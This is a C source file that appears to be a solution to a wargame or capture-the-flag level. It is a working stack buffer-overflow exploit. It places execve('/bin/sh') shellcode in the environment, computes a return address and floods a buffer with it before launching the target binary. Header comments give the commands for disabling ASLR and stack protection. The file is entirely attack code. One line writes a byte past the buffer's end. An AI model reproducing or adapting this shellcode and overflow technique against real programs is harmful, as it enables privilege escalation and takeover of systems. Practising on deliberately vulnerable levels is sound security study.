// Disable Address Space Layout Randomization: sysctl -w kernel.randomize_va_space=0
// Disable stack protection: gcc -Wall -g -fno-stack-protector -z execstack level05.c -o level05

#include <stdio.h>
#include <string.h>
#include <unistd.h>

char sc[] = "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
extern char **environ;

int main(int argc, char **argv)
{
	int buf_size = 4112;
        char buf[buf_size];

        char *env[2] = {sc, NULL};
	const char *binary_path = "/levels/level2/level2";
	const char *binary = "level2";
        int i;
	int *ptr;


	printf("Using buf size: %d\n", buf_size);


        int ret = 0xbfffffff
		- 4								/* 4 null bytes */
		- strlen(binary_path) - 1	/* binary + null byte */
		- strlen(sc)							/* shellcode + null byte */
		;
       
        
	printf("Removing environment variables\n");
        for(i = 0; environ[i] != NULL; i++) {
		memset(environ[i], 0x00, strlen(environ[i]));
	}


	printf("Adding return address to buf: 0x%x\n", ret);
        ptr = (int *)(buf);
        for (i = 0; i < buf_size; i += 4) {
                *ptr++ = ret;
	}
	buf[buf_size] = '\0';

        execle(binary_path, binary, "fsckmelogic", buf, NULL, env);
	return 0;
}
